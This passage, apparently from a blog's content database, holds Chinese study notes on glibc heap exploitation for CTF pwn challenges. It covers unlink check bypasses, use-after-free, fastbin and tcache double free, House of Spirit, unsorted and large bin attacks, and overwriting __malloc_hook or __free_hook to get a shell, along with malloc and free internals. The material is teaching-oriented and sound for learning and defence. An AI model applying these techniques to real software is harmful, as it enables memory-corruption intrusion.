class=\"number\">0x10</span>)=FD</span><br></pre></td></tr></table></figure>\n\n<p>因此，如果我们能让FD，即<strong>FD指向目标地址addr-0x18的位置，并且BK为我们想要修改为的内容value</strong>，而且*(value+0x10)可写，那么我们就可以修改addr为我们指定的内容value。（比如可以修改GOT表项）</p>\n<p>然而现在的libc中，<strong>进行赋值之前</strong>有对fd和bk的检查:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// fd bk</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class=\"number\">0</span>))                      </span><br><span class=\"line\">  malloc_printerr (check_action, <span class=\"string\">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br></pre></td></tr></table></figure>\n\n<p>为了绕过检查，我们需要伪造FD和BK，使其满足下列条件之后才能赋值。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*(fakeFD+<span class=\"number\">0x18</span>)==P==*(fakeBK+<span class=\"number\">0x10</span>)</span><br><span class=\"line\"><span class=\"comment\">//因此fakeFD=&amp;P-0x18</span></span><br><span class=\"line\"><span class=\"comment\">//fakeBK=&amp;P-0x10</span></span><br></pre></td></tr></table></figure>\n\n<p>执行unlink时</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*(fakeFD+<span class=\"number\">0x18</span>)=fakeBK</span><br><span class=\"line\">*(fakeBK+<span class=\"number\">0x10</span>)=fakeFD</span><br><span class=\"line\"><span class=\"comment\">//由于*(FD+0x18)==P==*(BK+0x10)</span></span><br><span class=\"line\"><span class=\"comment\">//因此等价于</span></span><br><span class=\"line\"><span class=\"comment\">//*P=&amp;P-0x10</span></span><br><span class=\"line\"><span class=\"comment\">//*P=&amp;P-0x18</span></span><br></pre></td></tr></table></figure>\n\n<p>最终*P=&amp;P-0x18，即P指向了比原来低0x18的位置。</p>\n<p>通过这种方法，如果我们能控制small bin或unsorted bin中chunk的fd和bk，并且我们能知道这个chunk的地址，那么就可以利用unlink使得该chunk指针ptr指向ptr-0x18的位置。</p>\n<p>过程：</p>\n<ol>\n<li>修改ptr-&gt;fd=ptr-0x18</li>\n<li>修改ptr-&gt;bk=ptr-0x10</li>\n<li>触发unlink</li>\n</ol>\n<h3 id=\"Use-After-Free-UAF\"><a href=\"#Use-After-Free-UAF\" class=\"headerlink\" title=\"Use After Free(UAF)\"></a>Use After Free(UAF)</h3><p>就像它的名字一样，UAF指的是1个chunk被释放后被使用，主要有2种情况：</p>\n<ol>\n<li>chunk被释放后，对应的指针赋值为NULL，但其他函数执行前没有进行检查，仍会对其进行操作，导致程序崩溃。</li>\n<li>chunk被释放后，对应的指针没有被赋NULL，此时其他函数可以正常对该chunk进行操作。</li>\n</ol>\n<p>一般第2种情况是我们利用的。UAF需要搭配其他方法进行使用，比如根据unsorted bin chunk的特性，用函数输出已经释放的chunk中的内容，从而泄露信息；或者用来修改fast bin chunk的fd，达到fast bin attack…</p>\n<h3 id=\"Fast-bin-Attack\"><a href=\"#Fast-bin-Attack\" class=\"headerlink\" title=\"Fast bin Attack\"></a>Fast bin Attack</h3><p>Fastbin Attack通常指基于fastbin机制的利用，利用的前提是：</p>\n<ul>\n<li>存在堆溢出或UAF等能控制chunk内容的漏洞</li>\n<li>漏洞发生于fast bin chunk</li>\n</ul>\n<p>Fastbin Attack主要利用的是fastbin的特殊机制，fastbin是使用<strong>单链表(fd)<strong>来维护释放的堆块的，并且由fastbin管理的 chunk</strong>即使被释放，其next_chunk的prev_inuse位也不会被清空</strong>。 </p>\n<h4 id=\"Fastbin-Double-Free\"><a href=\"#Fastbin-Double-Free\" class=\"headerlink\" title=\"Fastbin Double Free\"></a>Fastbin Double Free</h4><p>Fastbin Double Free通过对1个chunk的多次释放，改变fast bin中fd的指向。其利用的主要是<strong>fastbin不会清空prev_inuse位</strong>，并且在释放时，<strong>只检查当前释放的chunk与bin头结点指向的chunk是否相同</strong>，而没有检查后续的chunk的机制。</p>\n<p>因此，我们只要在两次释放之间隔着一个不同的chunk，就可以实现Fastbin Double Free。</p>\n<p>在释放之后，fast bin的结构如下：</p>\n<p><img src=\"./heap_attack/FastbinDoubleFree.png\" alt=\"FastbinDoubleFree\"></p>\n<p>在1次malloc之后，我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。如果<strong>更进一步修改 fd 指针</strong>，则能够实现<strong>任意地址分配堆块</strong>的效果 (首先要通过验证，即size符合当前fast bin的大小)，这就相当于任意地址任意写的效果。</p>\n<h4 id=\"House-of-Spirit\"><a href=\"#House-of-Spirit\" class=\"headerlink\" title=\"House of Spirit\"></a>House of Spirit</h4><p>House of Spirit是通过在目标位置<strong>伪造</strong>fastbin chunk，并让其被释放，从而达到<strong>申请指定地址内存</strong>的目的。</p>\n<p>由于free的特性，House of Spirit的重点在于<strong>修改指定地址前后的内容使其能绕过free的检测</strong>。</p>\n<p>需要的绕过：</p>\n<ul>\n<li>fake chunk的<strong>ISMMAP位不能为1</strong>，因为 free 时，如果是mmap的chunk，会单独处理。</li>\n<li>fake chunk<strong>地址需要对齐</strong>。</li>\n<li>fake chunk的<strong>size大小需要满足对应的fastbin</strong> 的需求，同时也得<strong>对齐</strong>。</li>\n<li>fake chunk的next chunk的大小<strong>不能小于2 * SIZE_SZ</strong>，同时也<strong>不能大于av-&gt;system_mem</strong> 。</li>\n<li>fake chunk对应的fastbin<strong>链表头部不能是该fake chunk</strong>，即不能构成double free的情况。</li>\n</ul>\n<p>在达成条件之后，将该fake chunk释放，再重新malloc就能得到该部分内存。</p>\n<h4 id=\"Arbitrary-Alloc\"><a href=\"#Arbitrary-Alloc\" class=\"headerlink\" title=\"Arbitrary Alloc\"></a>Arbitrary Alloc</h4><p>由于fast bin中通过fd指向下一个chunk，如果我们<strong>将想要获取的内存看作一个fake chunk</strong>，那么只要其<strong>size的大小满足fast bin的要求</strong>，并且<strong>控制fast bin中的fd指向fake chunk</strong>，那么我们就能将这个fake chunk申请过来，实现任意读或任意写。</p>\n<p>要让size满足要求，我们可以<strong>逐字节进行调节（参考malloc到__malloc_hook的过程）</strong>，找到在fast bin size范围内的大小，且能包含我们想要的内存即可。（由于不用绕过free，可以不用对齐）</p>\n<p>要控制fast bin中chunk的fd，可以利用Fastbin Double Free、UAF、overlapping、堆溢出等方法。</p>\n<h3 id=\"Unsorted-bin-Attack\"><a href=\"#Unsorted-bin-Attack\" class=\"headerlink\" title=\"Unsorted bin Attack\"></a>Unsorted bin Attack</h3><p>Unsorted bin Attack是对unsorted bin机制的利用。</p>\n<h4 id=\"Unsorted-bin-Leak\"><a href=\"#Unsorted-bin-Leak\" class=\"headerlink\" title=\"Unsorted bin Leak\"></a>Unsorted bin Leak</h4><p>Unsort bin Leak主要是利用了unsorted bin使用<strong>fd和bk的双向链表</strong>管理chunk的机制，<strong>始终会有一个chunk的fd和一个chunk的bk指向unsorted bin的头结点，而头结点在main_arena内部</strong>，与main_arena的偏移是固定的(96)。特别的，当只有1个chunk的时候，这个chunk的fd和bk都会指向一个unsorted bin的头结点。</p>\n<p>因此，借助UAF、overlapping等方式，我们可以泄露unsorted bin头结点的地址，从而得到main_arena，再利用与main_arena固定偏移0x10的__malloc_hook得到出libc。（也可以通过malloc_trim()函数得出）</p>\n<h4 id=\"Unsorted-bin-Attack-1\"><a href=\"#Unsorted-bin-Attack-1\" class=\"headerlink\" title=\"Unsorted bin Attack\"></a>Unsorted bin Attack</h4><p>Unsorted bin Attack利用了unsorted bin的特性，当一个chunk从unsorted bin中取出的时候，会将unsorted bin的地址写入到bck-&gt;fd的位置（bck==P-&gt;bk）。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//相当于将unsorted bin放在了victim的位置，修改bck和bin的fd和bk指针</span></span><br><span class=\"line\">bck = victim-&gt;bk;</span><br><span class=\"line\">unsorted_chunks(av)-&gt;bk = bck;</span><br><span class=\"line\">bck-&gt;fd = unsorted_chunks(av);</span><br></pre></td></tr></table></figure>\n\n<p>换而言之，如果我们能<strong>控制一个unsorted bin chunk的bk</strong>，并且将其取出，那么就能<strong>在bk+0x10的位置写入unsorted bin的地址</strong>。这个地址通常是一个<strong>很大的值</strong>，借助这点，我们可以<strong>控制程序执行流程</strong>（改变判断条件，修改循环次数），甚至可以修改heap中的global_max_fast来<strong>使得更大的chunk可以被视为fast bin</strong>，这样我们就可以去执行一些fast bin attack了。</p>\n<h3 id=\"Large-bin-Attack\"><a href=\"#Large-bin-Attack\" class=\"headerlink\" title=\"Large bin Attack\"></a>Large bin Attack</h3><p>Large bin Attack利用的是chunk从unsorted bin进入到large bin时缺少检查。当malloc遍历unsorted bin时，如果该chunk<strong>不是刚好满足大小并且不满足切割条件</strong>的话，则会放入对应的bin中。而在放入large bin的时候，缺少了对nextsize指针的检查。通过Large bin Attack，可以<strong>将当前chunk的地址写入bk_nextsize+0x20的位置</strong>（类似unsorted bin attack）。</p>\n<p>在2.29及以下版本的glibc中，根据chunk的大小有不同的利用。</p>\n<p>如果chunk<strong>小于</strong>该large bin中最小的chunk的时候会执行:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fwd = bck; <span class=\"comment\">//使得fwd=large bin</span></span><br><span class=\"line\">bck = bck-&gt;bk; <span class=\"comment\">//使得bck=末尾的chunk(最小的chunk)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//下面均没有对victim的nextsize指针进行检测就直接赋值了</span></span><br><span class=\"line\">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class=\"line\">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class=\"line\">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class=\"line\"><span class=\"comment\">//fwd为当前chunk的fd指向的chunk，在这种情况下为large bin头，victim为当前chunk</span></span><br><span class=\"line\"><span class=\"comment\">//这条语句的作用是：修改通过nextsize指针连接的相邻chunk的fd_nextsize和bk_nextsize，即在nextsize list中插入新的chunk</span></span><br></pre></td></tr></table></figure>\n\n<p>如果chunk<strong>大于</strong>该large bin中最小的chunk的时候会执行:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>\n\n<p>如果chunk<strong>等于</strong>该large bin中最小的chunk，则会使用其他方法插入，所以此时无法利用。</p>\n<p>在2.30版本新加入了对largebin跳表的完整性检查，使chunk大于链表中最小的chunk时的利用失效，必须使chunk<strong>小于</strong>链表中最小的chunk，通过下面的语句将当前chunk的地址写入bk_nextsize+0x20的位置。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>\n\n<p>Large bin Attack的条件：</p>\n<ol>\n<li>可以修改一个large bin chunk的 data</li>\n<li>从unsorted bin中来的large bin chunk要紧跟在被构造过的chunk的后面</li>\n</ol>\n<p>作用：</p>\n<ol>\n<li>通过large bin attack可以辅助Tcache Stash Unlink+攻击</li>\n<li>可以修改_IO_list_all便于伪造_IO_FILE 结构体进行FSOP。</li>\n</ol>\n<h3 id=\"Tcache-Attack\"><a href=\"#Tcache-Attack\" class=\"headerlink\" title=\"Tcache Attack\"></a>Tcache Attack</h3><p>由于Tcache本身检查约等于0，因此Tcache的利用都方便许多。其本身可以看作是没有什么检查的fast bin。</p>\n<h4 id=\"Tcache-Poisoning\"><a href=\"#Tcache-Poisoning\" class=\"headerlink\" title=\"Tcache Poisoning\"></a>Tcache Poisoning</h4><p>主要利用的是tcache_get()从tcache中获取chunk的时候几乎没有检查，会利fd指针逐个取出chunk。因此，只需要<strong>将tcache中的chunk的fd指向任意内存即可将其取出</strong>。</p>\n<h4 id=\"Tcache-Dup（Tcache-Double-free）\"><a href=\"#Tcache-Dup（Tcache-Double-free）\" class=\"headerlink\" title=\"Tcache Dup（Tcache Double free）\"></a>Tcache Dup（Tcache Double free）</h4><p>类似于fast bin dup(Fast bin Double free)，不过利用的是tcache_put()中的不严谨，<strong>可以直接连续free同一个chunk来做到double free</strong>。</p>\n<p>但在glibc2.29之后，tcache中增加了对此的检查，会在tcache_entry中引入一个标志key，表示chunk是否已经在该tcache bin中，每个chunk在放入tcache时都会检查key。</p>\n<p>即便如此有些方法能绕过检查的，不过需要利用fast bin double free和tcache stash机制。</p>\n<p>(1) 首先需要将tcache填满并实现fast bin double free</p>\n<p><code>tcache</code>中为：<code>C6-&gt;C5-&gt;C4-&gt;C3-&gt;C2-&gt;C1-&gt;C0</code>，<code>fast bin</code>中为：<code>C7-&gt;C8-&gt;C7</code>。</p>\n<p>(2) 之后，为了分配到<code>fast bin</code>，需要先申请<code>7</code>个，让<code>tcache</code>为空（或<code>calloc</code>），再次申请时就会返回<code>fast bin</code>中的<code>C7</code>，同时由于<code>tcache stash</code>机制，<code>fast bin</code>中剩下的<code>C8</code>,<code>C7</code>均被放入了<code>tcache bin</code>。此时，在<code>C7</code>的<code>fd</code>字段写入<code>target_addr</code>（相当于获得了<code>Edit</code>功能），于是<code>target_addr</code>也被放入了<code>tcache bin</code>，因此这里<code>target_addr</code>处甚至不需要伪造<code>size</code>（<code>target_addr</code>指向<code>user data</code>区）。<br>(3) 此时，<code>tcache bin</code>中单链表为：<code>C8-&gt;C7-&gt;target_addr</code>，再申请到<code>target_addr</code>，从而得到了一个真正的任意写。</p>\n<h4 id=\"Tcache-Perthread-Corruption\"><a href=\"#Tcache-Perthread-Corruption\" class=\"headerlink\" title=\"Tcache Perthread Corruption\"></a>Tcache Perthread Corruption</h4><p>tcache_perthread_struct是整个tcache的管理结构，而<strong>这个结构是存储在堆上</strong>的。如果能控制这个结构体，那么无论我们malloc的size是多少，地址都是可控的。不过这需要我们利用其它方法来申请到这块内存。</p>\n<h4 id=\"Tcache-House-Of-Spirit\"><a href=\"#Tcache-House-Of-Spirit\" class=\"headerlink\" title=\"Tcache House Of Spirit\"></a>Tcache House Of Spirit</h4><p>原理是House Of Spirit，不过由于tcache检查的松散，因此更容易利用，我们<strong>可以不用管prev_inuse位</strong>，但其他条件仍是需要满足的。</p>\n<p>如：</p>\n<ul>\n<li>fake chunk的<strong>ISMMAP位不能为1</strong>，因为 free 时，如果是mmap的chunk，会单独处理。</li>\n<li>fake chunk<strong>地址需要对齐</strong>。</li>\n<li>fake chunk的next chunk的大小<strong>不能小于2 * SIZE_SZ</strong>，同时也<strong>不能大于av-&gt;system_mem</strong> 。</li>\n</ul>\n<h4 id=\"Tcache-Stashing-Unlink-Attack\"><a href=\"#Tcache-Stashing-Unlink-Attack\" class=\"headerlink\" title=\"Tcache Stashing Unlink Attack\"></a>Tcache Stashing Unlink Attack</h4><p>这种攻击利用的是tcache有<strong>剩余</strong>时，同大小的small bin会放进tcache中。在获取到一个smallbin中的一个chunk后会如果tcache仍有足够空闲位置，会将<strong>剩余的</strong>small bin链入tcache，在这个过程中<strong>只对第一个bin进行了完整性检查</strong>。</p>\n<p>当攻击者可以写一个small bin的bk指针时，其可以在任意地址上写一个libc地址 (类似 unsorted bin attack 的效果)。构造得当的情况下也可以分配 fake chunk 到任意地址。</p>\n<p>而calloc分配堆块时<strong>不从tcache中选取，直接从small bin中取</strong>，可以触发攻击。</p>\n<p>具体利用：</p>\n<p>想办法改写smallbin中<strong>倒数第二个chunk的bk</strong>指向fake chunk，在利用calloc取出了small bin中的一个chunk后，剩余的chunk会放入tcache中。Small bin遵循<strong>FIFO</strong>，<strong>利用bk进行遍历</strong>，因此倒数第二个chunk会先放入tcache，fake chunk会后放入tcache。由于tcache遵循<strong>LIFO</strong>，因此此时处于tcache头的是fake chunk，下一次malloc即可得到其内存。</p>\n<h4 id=\"libc-leak\"><a href=\"#libc-leak\" class=\"headerlink\" title=\"libc leak\"></a>libc leak</h4><p>算是tcache带来的一点点麻烦，要用到bin的话需要先将对应的tcache填满。</p>"},{"title":"Heap Operation","date":"2023-01-01T16:01:00.000Z","_content":"这部分是对堆的一些操作（函数）的分析\n\n<!-- more -->\n### unlink\n\nunlink的作用**是将一个chunk从bin中取出**，在malloc、free、malloc_consolidate、realloc等函数中会用到。\n\n**值得注意的是：由于对fast bin和small bin的malloc没有用到unlink，因此经常会有漏洞在此处**\n\n#### 古老的unlink\n\n古老的unlink没有什么检查，只是单纯地把chunk从双向链表中取出，主要操作为：\n\n```c\n//P是要取出的chunk\nFD=P->fd;//FD为P的下一个chunk\nBK=P->bk;//BK为P的前一个chunk\n\n//在fd和bk的双向链表中去掉P\nFD->bk=BK;\nBK->fd=FD;\n\n//下面是针对large bin中nextsize字段的处理\n// 如果P->fd_nextsize为 NULL，表明 P 未插入到 nextsize 链表中。\n// 那么其实也就没有必要对 nextsize 字段进行修改了。\n// 这里没有去判断 bk_nextsize 字段，可能会出问题。\nif (!in_smallbin_range (chunksize_nomask (P)) &&  __builtin_expect (P->fd_nextsize != NULL, 0)) {                      \n    //类似于小的 chunk 的检查思路                                             \n\n    //如果FD没有在nextsize链表中，说明FD大小与P一样\n    if (FD->fd_nextsize == NULL) \n    {                                      \n        //如果nextsize串起来的双链表只有P本身，那就直接拿走P\n        // 令 FD 为 nextsize 串起来的\n        if (P->fd_nextsize == P)                                      \n            FD->fd_nextsize = FD->bk_nextsize = FD;                      \n        else \n        {                                                              \n            //否则我们需要将FD插入到nextsize形成的双链表中\n            FD->fd_nextsize = P->fd_nextsize;                              \n            FD->bk_nextsize = P->bk_nextsize;                              \n            P->fd_nextsize->bk_nextsize = FD;                              \n            P->bk_nextsize->fd_nextsize = FD;                              \n        }                                                              \n    } \n    else \n    {                                                              \n        //如果在的话，说明FD比P小，直接拿走P即可\n        P->fd_nextsize->bk_nextsize = P->bk_nextsize;                      \n        P->bk_nextsize->fd_nextsize = P->fd_nextsize;                      \n    }                                                                      \n} \n\n```\n\n#### 现在的unlink\n\n现在的unlink加入了一些检查\n\n```c\n\n//在最开始处\n// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)\nif (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \n      malloc_printerr (\"corrupted size vs. prev_size\");               \n\n//在赋值FD和BK之前\n// 检查 fd 和 bk 指针(双向链表完整性检查)\nif (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \n  malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);  \n\n//在判断知道是large bin之后\n// largebin 中 next_size 双向链表完整性检查 \nif (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)|| __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \n              malloc_printerr (check_action, \"corrupted double-linked list (not small)\",P, AV);\n\n```\n\n即使在加了检查之后，unlink仍然存在可以利用的地方，这些之后再说。\n\n### malloc_consolidate\n\nmalloc_consolidate主要进行**合并整理**堆空间的操作，减少堆中的碎片，用于将 fastbin 中的空闲 chunk 合并整理到 unsorted_bin 中以及进行初始化堆的工作，在 malloc() 以及 free() 中均有可能调用 malloc_consolidate() 函数。\n\n若在调用malloc_consolidate()时，堆未初始化，则初始化堆。\n\n若已经初始化，则清空标志位，遍历fast bin中的chunk尝试合并。在合并时，首先考虑与**低地址的相邻chunk**合并，之后再考虑和**高地址的相邻chunk**合并，合并后加入到unsorted bin中（如果与top chunk合并则不用加入）。\n\nmalloc_consolidate()的调用情况：\n\n1. malloc一个**large bin chunk**的时候，会**首先调用一次malloc_consolidate()**对fast bin进行整理，之后会将unsorted bin中的chunk分配到对应的bin中。\n2. 如果malloc时要切割top chunk且**top chunk也不够切割**，那么会调用malloc_consolidate()对fast bin进行整理。\n\n一种特殊的consolidate:\n\n当切割chunk产生last remainder的时候，会触发consolidate对unsorted bin进行整理，但**并不会对fast bin进行整理**。\n\n### malloc\n\n[大佬的malloc源码分析](https://blog.csdn.net/qq_41453285/article/details/99005759)\n\n[大佬的malloc源码分析](https://www.cnblogs.com/luoleqi/p/12731875.html#malloc)\n\n使用malloc函数申请内存块时，真正调用的其实是_libc_malloc函数，而_libc_malloc函数主要是对_int_malloc函数的封装，主要的工作在_int_malloc函数中完成。\n\n#### _libc_malloc\n\n_libc_malloc主要的功能是对_int_malloc的调用，寻找一个arena并尝试利用_int_malloc()分配内存，如果失败了则重新寻找arena。\n\n值得注意的是，**_libc_malloc()中会有一个叫做__malloc_hook的函数指针，如果有值就会执行其指向的函数，利用这点，我们可以修改__malloc_hook的值来get shell**。\n\n除此之外，**在进入_libc_malloc()之后，size就变成了无符号整数，所以malloc(负数)会申请一个很大的内存，如果够的话**。\n\n#### _int_malloc\n\n_int_malloc是真正执行内存分配的部分，其核心思想是**最佳适配**。\n\n大致流程：\n\n1. 根据申请的chunk大小，到对应的bin中寻找有无合适的chunk\n    1. 对于fast bin chunk，通过fd进行查找，将离头结点**最近**的chunk取出，若空则在small bin中找。\n    2. 对于small bin chunk，通过bk进行查找，将离头结点**最远**的chunk取出。\n    3. 对于large bin chunk或者**fast bin和small bin中都无刚好满足的chunk**，即在large bin中查找\n2. 如果需要在large bin中找chunk，那么首先会执行malloc_consolidate()整理fast bin，整理后放入unsorted bin\n3. 通过**bk指针**，对unsorted bin中的chunk进行遍历，如果大小正好则取出返回，否则**先将chunk放入对应的bin**中，**切割比需求大的最小**chunk返回，last remainer会放入unsorted bin（如果大于等于MIN_SIZE）。**如果分配成功，则将unsorted bin中的free chunk放到对应的bin中**。\n4. 如果没有满足需求的，则在large bin中查找正好合适的chunk取出返回，如果没有但有比他大的large bin chunk，则切割该chunk后取出返回。**(large bin 中切割产生的last remainder 如果小于MIN_SIZE，则会一起交给malloc使用，而不是放入unsorted bin)**\n5. 如果仍没有满足需求，则从top chunk中切割。\n6. 如果top chunk中也不够，则会执行一次malloc_consolidate()，并将unsorted bin中free chunk放到对应bin，再查找一次是否有能够分配的。\n7. 最后实在没办法就只能调用sysmalloc()进行分配。\n\n### free\n\n[大佬的free源码分析](https://blog.csdn.net/qq_41453285/article/details/99071778)\n\n[大佬的free源码分析](https://www.cnblogs.com/luoleqi/p/12822833.html)\n\n与malloc类似，free调用的也是_libc_free，实际上起主要作用的也是其中的_int_free。\n\n#### _libc_free\n\n主要功能：\n\n1. 检查有没有__free_hook，有则调用（**类似__malloc_hook，可以修改来get shell**）\n2. 如果chunk为NULL，则啥也不干\n3. 如果是mmap的chunk，则调用munmmap来free\n4. 调用_int_free()释放chunk\n\n#### _int_free\n\n对chunk进行释放，将其放入fast bin或unsorted bin，如果放入unsorted bin则考虑进行合并。\n\n主要流程：\n\n1. 进行安全检查，chunk的指针地址不能溢出，chunk的大小必须是按是按 2*SIZE_SZ 对齐的且大于等于MINSIZE\n2. 如果该chunk是fast bin chunk，则检查下一个chunk的size是否合法，之后**检查当前free的chunk是否是fast bin头结点连接的chunk**（防止直接的double free），之后将该chunk加入到对应大小的fast bin头（**不会清空prev_inuse**），释放结束\n3. 如果该chunk不是fast bin chunk，则考虑加入unosrted bin，先进行检查，保证当前chunk不能是top chunk，并且下一个chunk的size要合法（大于等于MIN_SIZE且小于该arena的内存总量）\n4. 之后考虑进行合并，先考虑与**前一个**free chunk进行合并，再考虑与**后一个不是top chunk的（如果下一个是top chunk则会并入top chunk）**free chunk进行合并,如果不能合并，则会清除后一个chunk的prev_inuse位，合并后将chunk加入到unsorted bin中。（large bin chunk 的fd_nextsize和bk_nextsize会赋NULL）\n5. 如果合并后的 chunk 大小大于 64KB，并且 fast bins 中存在空闲 chunk，调用 malloc_consolidate()函数合并 fast bins 中的空闲 chunk 到 unsorted bin 中。\n6. 判断是否需要对heap收缩，如果需要则收缩。\n\n注意：\n\n1. 释放chunk大小要2*SIZE_EZ对其，大小大于等于MIN_SIZE且没有地址溢出\n2. 释放fast bin，会检查bin头指向的chunk与该chunk是否一致，防止double free(**如果隔一个仍能实现fast bin double free**)\n3. 释放chunk的时候，chunk不能为top chunk，next chunk的地址不能超过当前分配区结束的地址，以及next chunk中chunk的prev_inuse标志位需置1(**构造house of spirit**)\n4. 当前 free 的 chunk 的下一个相邻 chunk 的大小需要大于 2*SIZE_SZ 且小于分配区所分配区的内存总量(**构造house of spirit**)\n5. 释放的chunk通过unlink脱链，注意unlink的检查(**也许会有对unlink的利用**)","source":"_posts/heap_operation.md","raw":"---\ntitle: Heap Operation\ndate: 2023-01-02 00:01:00\ncategories: \n- pwn\ntags: \n- pwn\n- heap \n---\n这部分是对堆的一些操作（函数）的分析\n\n<!-- more -->\n### unlink\n\nunlink的作用**是将一个chunk从bin中取出**，在malloc、free、malloc_consolidate、realloc等函数中会用到。\n\n**值得注意的是：由于对fast bin和small bin的malloc没有用到unlink，因此经常会有漏洞在此处**\n\n#### 古老的unlink\n\n古老的unlink没有什么检查，只是单纯地把chunk从双向链表中取出，主要操作为：\n\n```c\n//P是要取出的chunk\nFD=P->fd;//FD为P的下一个chunk\nBK=P->bk;//BK为P的前一个chunk\n\n//在fd和bk的双向链表中去掉P\nFD->bk=BK;\nBK->fd=FD;\n\n//下面是针对large bin中nextsize字段的处理\n// 如果P->fd_nextsize为 NULL，表明 P 未插入到 nextsize 链表中。\n// 那么其实也就没有必要对 nextsize 字段进行修改了。\n// 这里没有去判断 bk_nextsize 字段，可能会出问题。\nif (!in_smallbin_range (chunksize_nomask (P)) &&  __builtin_expect (P->fd_nextsize != NULL, 0)) {                      \n    //类似于小的 chunk 的检查思路                                             \n\n    //如果FD没有在nextsize链表中，说明FD大小与P一样\n    if (FD->fd_nextsize == NULL) \n    {                                      \n        //如果nextsize串起来的双链表只有P本身，那就直接拿走P\n        // 令 FD 为 nextsize 串起来的\n        if (P->fd_nextsize == P)                                      \n            FD->fd_nextsize = FD->bk_nextsize = FD;                      \n        else \n        {                                                              \n            //否则我们需要将FD插入到nextsize形成的双链表中\n            FD->fd_nextsize = P->fd_nextsize;                              \n            FD->bk_nextsize = P->bk_nextsize;                              \n            P->fd_nextsize->bk_nextsize = FD;                              \n            P->bk_nextsize->fd_nextsize = FD;                              \n        }                                                              \n    } \n    else \n    {                                                              \n        //如果在的话，说明FD比P小，直接拿走P即可\n        P->fd_nextsize->bk_nextsize = P->bk_nextsize;                      \n        P->bk_nextsize->fd_nextsize = P->fd_nextsize;                      \n    }                                                                      \n} \n\n```\n\n#### 现在的unlink\n\n现在的unlink加入了一些检查\n\n```c\n\n//在最开始处\n// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)\nif (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \n      malloc_printerr (\"corrupted size vs. prev_size\");               \n\n//在赋值FD和BK之前\n// 检查 fd 和 bk 指针(双向链表完整性检查)\nif (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \n  malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);  \n\n//在判断知道是large bin之后\n// largebin 中 next_size 双向链表完整性检查 \nif (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)|| __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \n              malloc_printerr (check_action, \"corrupted double-linked list (not small)\",P, AV);\n\n```\n\n即使在加了检查之后，unlink仍然存在可以利用的地方，这些之后再说。\n\n### malloc_consolidate\n\nmalloc_consolidate主要进行**合并整理**堆空间的操作，减少堆中的碎片，用于将 fastbin 中的空闲 chunk 合并整理到 unsorted_bin 中以及进行初始化堆的工作，在 malloc() 以及 free() 中均有可能调用 malloc_consolidate() 函数。\n\n若在调用malloc_consolidate()时，堆未初始化，则初始化堆。\n\n若已经初始化，则清空标志位，遍历fast bin中的chunk尝试合并。在合并时，首先考虑与**低地址的相邻chunk**合并，之后再考虑和**高地址的相邻chunk**合并，合并后加入到unsorted bin中（如果与top chunk合并则不用加入）。\n\nmalloc_consolidate()的调用情况：\n\n1. malloc一个**large bin chunk**的时候，会**首先调用一次malloc_consolidate()**对fast bin进行整理，之后会将unsorted bin中的chunk分配到对应的bin中。\n2. 如果malloc时要切割top chunk且**top chunk也不够切割**，那么会调用malloc_consolidate()对fast bin进行整理。\n\n一种特殊的consolidate:\n\n当切割chunk产生last remainder的时候，会触发consolidate对unsorted bin进行整理，但**并不会对fast bin进行整理**。\n\n### 